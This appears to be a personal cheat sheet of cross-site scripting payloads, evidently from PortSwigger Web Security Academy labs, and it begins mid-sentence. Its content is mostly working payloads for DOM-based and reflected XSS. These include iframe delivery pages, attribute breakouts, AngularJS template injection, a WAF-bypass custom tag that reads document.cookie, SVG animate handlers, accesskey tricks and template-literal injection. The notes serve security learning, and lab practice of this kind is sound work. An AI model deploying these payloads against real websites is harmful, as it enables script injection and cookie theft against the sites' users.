location.hash and passed to jQuery.parseHTML
To exploit it you can use



<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>


----------------------------------------------------------------------------------

In the search bar when there is a Cross-site scripting (reflected)
"onmouseover="alert(1)

----------------------------------------------------------------------------------

In some cases insert this into the javascript code
-alert(1)-

----------------------------------------------------------------------------------

"></select><img%20src=1%20onerror=alert(1)>

----------------------------------------------------------------------------------

Javascript
{{$on.constructor('alert(1)')()}}

----------------------------------------------------------------------------------

Reflected DOM XSS
\"-alert(1)}// 
The "//" is to comment the code in Javascript to mantain the syntax correct 

----------------------------------------------------------------------------------

Escape restrictions
<><img src=1 onerror=alert(1)>

----------------------------------------------------------------------------------

Sometimes use burp intruder in case the tags aren't allowed, try to bruteforce it with the list of tags available on this page:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
insert this "<§§>" to place a payload

Example of a payload to deliver to the victim to cause a print 
<iframe src="https://0a8d00c5044f1270c00943c5008200a1.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'> 

This will cause a print()

----------------------------------------------------------------------------------

Custom payload to bypass WAFs

<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

USE THE DECODER TO UNDERSTAND IT
This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.

----------------------------------------------------------------------------------

Another common payload
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
"><svg><animatetransform onbegin=alert(1)> or "><svg><animatetransform onbegin=alert(1)>//

----------------------------------------------------------------------------------

This alert could be trigged by ALT+SHIFT+X or CTRL+ALT+X
https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
'accesskey='x'onclick='alert(1)

To trigger the exploit on yourself, press one of the following key combinations:
On Windows: ALT+SHIFT+X
On MacOS: CTRL+ALT+X
On Linux: Alt+X

----------------------------------------------------------------------------------

\';alert(1)//139
\'-alert(1)//
</script><script>alert(1)</script>


Another payload to put into the link with an onclick event

http://foo?&apos;-alert(1)-&apos;
http://foo?'-alert(1)-'


In case of this common template to make evidence of XSS:

                       <script>
                            var message = `0 search results for 'sad'`;
                            document.getElementById('searchMessage').innerText = message;
                        </script>
                        
use 

 ${alert(1)}
 
 ----------------------------------------------------------------------------------

 
 <svg><a><animate+attributeName=href+values=javascript:alert(1) /><text+x=20+y=20>Click me</text></a>